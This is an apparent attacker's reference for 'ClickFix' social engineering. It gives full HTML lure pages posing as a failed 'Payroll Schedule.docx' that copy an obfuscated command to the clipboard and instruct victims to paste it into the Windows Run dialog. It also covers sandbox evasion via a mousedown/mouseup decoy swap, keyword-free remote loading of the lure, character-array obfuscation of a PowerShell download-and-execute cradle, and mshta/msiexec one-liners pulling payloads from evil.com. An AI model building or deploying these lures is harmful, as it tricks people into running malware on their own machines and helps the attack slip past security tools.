# ClickFix Social Engineering Reference

## Concept
ClickFix tricks users into running a malicious command by presenting a fake error that requires a "fix". The website copies a command to the clipboard via `navigator.clipboard.writeText`, then instructs the user to open Win+R (Run dialog) and paste.

## Clipboard API Rules
- Requires a **trusted user interaction** (click, keypress) to work
- Multiple synchronous calls within one event handler are allowed
- Async calls (setTimeout, await) lose the user activation context
- Browsers impose a short timeout after gesture

---

## Template 1: Extension Required

```html
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<title>Document Failed To Load</title>
<style>
    html,body{height:100%;margin:0;}
    body{background:url('bg.png') no-repeat center center fixed;background-size:cover;
        display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif;}
    .card{background:#fff;padding:40px 60px;text-align:center;border-radius:8px;
        box-shadow:0 4px 12px rgba(0,0,0,.1);max-width:400px;width:90%;display:none;}
    .card img{width:80px;height:80px;object-fit:contain;margin-bottom:24px;}
    .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
    .card p{font-size:1rem;color:#555;margin:0 0 32px;}
    .card p button{background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;cursor:default;}
    .actions{display:flex;gap:16px;justify-content:center;}
    .btn{flex:1;padding:12px 0;font-size:1rem;border:none;border-radius:4px;cursor:pointer;}
    .btn.fix{background:#007bff;color:#fff;}
    .btn.details{background:#e0e0e0;color:#333;}
    #overlay{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;
        align-items:center;justify-content:center;z-index:9999;}
    .spinner{width:48px;height:48px;border:6px solid #e0e0e0;border-top-color:#007bff;
        border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px;}
    @keyframes spin{to{transform:rotate(360deg);}}
</style></head>
<body>
<div id="overlay"><div class="spinner"></div><h2>Fetching encrypted document...</h2></div>
<div class="card">
    <img src="icon.png" alt="Icon">
    <h1>"Payroll Schedule.docx" Failed To Load</h1>
    <p>A browser extension is required to view this encrypted document.</p>
    <div class="actions">
        <button class="btn fix">Fix</button>
        <button class="btn details">Details</button>
    </div>
</div>
<script>
setTimeout(function(){
    document.getElementById('overlay').remove();
    document.querySelector('.card').style.display='block';
},3000);

function _w(t){
    var a=["n","a","v","i","g","a","t","o","r"].join("");
    var b=["c","l","i","p","b","o","a","r","d"].join("");
    var c=["w","r","i","t","e","T","e","x","t"].join("");
    window[a][b][c](t);
}

document.body.addEventListener('click',function(e){
    if(e.target.matches('.btn.fix')){
        var x=["c","m","d",".","e","x","e"," ","/","c"," ","\"",
            "p","i","n","g"," ","e","x","a","m","p","l","e",".","c","o","m","\""].join("");
        _w(x);
        document.querySelector('.card').innerHTML=
            '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;">'+
            '<h1>Download Extension</h1>'+
            '<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
    }
});
</script>
</body></html>
```

---

## Template 2: Activation Code

```html
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<title>Document Failed To Load</title>
<style>
    html,body{height:100%;margin:0;}
    body{background:url('bg.png') no-repeat center center fixed;background-size:cover;
        display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif;}
    .card{background:#fff;padding:40px 60px;text-align:center;border-radius:8px;
        box-shadow:0 4px 12px rgba(0,0,0,.1);max-width:400px;width:90%;}
    .code-viewer{position:relative;background:#f5f5f5;border:1px solid #ddd;border-radius:6px;
        padding:16px;font-family:Consolas,monospace;cursor:pointer;user-select:none;}
    .code-viewer:hover{background:#e0e0e0;}
    .hint{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
        color:#666;font-weight:600;background:rgba(255,255,255,.85);opacity:0;transition:opacity .2s;pointer-events:none;}
    .code-viewer:hover .hint{opacity:1;}
</style></head>
<body>
<div class="card">
    <img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:24px;">
    <h1>"Payroll Schedule.docx" Failed To Load</h1>
    <p>You need to activate Microsoft Word to view this document.</p>
    <div id="codeBlock" class="code-viewer">
        Activation Code: CXIAIUSDAIJSKDSK32281
        <div class="hint">CLICK TO COPY</div>
    </div>
</div>
<script>
function _w(t){var a=["n","a","v","i","g","a","t","o","r"].join(""),b=["c","l","i","p","b","o","a","r","d"].join(""),c=["w","r","i","t","e","T","e","x","t"].join("");window[a][b][c](t);}
document.getElementById('codeBlock').addEventListener('click',function(){
    _w(["c","m","d",".","e","x","e"," ","/","c"," ","\"","p","i","n","g"," ","e","x","a","m","p","l","e",".","c","o","m","\""].join(""));
    document.querySelector('.card').innerHTML='<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;"><h1>Activate Microsoft Word</h1><p>Press <button style="background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;">Win</button> + <button style="background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;">R</button>, then <button style="background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;">Ctrl</button> + <button style="background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;">V</button>, then <button style="background:#e8e8e8;border:1px solid #ccc;border-radius:4px;padding:2px 8px;">Enter</button>.</p>';
});
</script>
</body></html>
```

---

## Anti-Sandbox: MouseDown/MouseUp Split
Write decoy command on mousedown, real command on mouseup. Sandboxes that capture clipboard on first write get the harmless version.

```javascript
codeBlock.addEventListener('mousedown', function() {
    _w('echo Verification successful');
});
codeBlock.addEventListener('mouseup', function() {
    _w(realCommand);
});
```

---

## Anti-Detection: Remote Content Fetch
Main page contains no suspicious keywords. Actual ClickFix content loaded at runtime:

```html
<div id="content"></div>
<script>
fetch('content.html')
  .then(r => r.text())
  .then(html => {
    document.getElementById('content').innerHTML = html;
    document.getElementById('content').querySelectorAll('script').forEach(s => {
        var ns = document.createElement('script');
        ns.textContent = s.textContent;
        document.body.appendChild(ns);
    });
  });
</script>
```

---

## Command Obfuscation
Break the command into array elements to avoid static keyword detection:
```javascript
var a=["n","a","v","i","g","a","t","o","r"].join("");
var b=["c","l","i","p","b","o","a","r","d"].join("");
var c=["w","r","i","t","e","T","e","x","t"].join("");
var cmd=["p","o","w","e","r","s","h","e","l","l"," ","-","C","o","m","m","a","n","d"," ","\"","I","E","X","(","N","e","w","-","O","b","j","e","c","t"," ","N","e","t",".","W","e","b","C","l","i","e","n","t",")",".","D","o","w","n","l","o","a","d","S","t","r","i","n","g","(","'","h","t","t","p","s",":","example",".","c","o","m","/","s","'",")","\""].join("");
window[a][b][c](cmd);
```

## Common Execution Methods
- `cmd.exe /c "..."` — basic command execution
- `powershell.exe -Command "..."` — PowerShell with obfuscation support
- `mshta.exe https://evil.com/payload.hta` — HTA file execution
- `msiexec /i /q https://evil.com/payload.msi` — silent MSI install
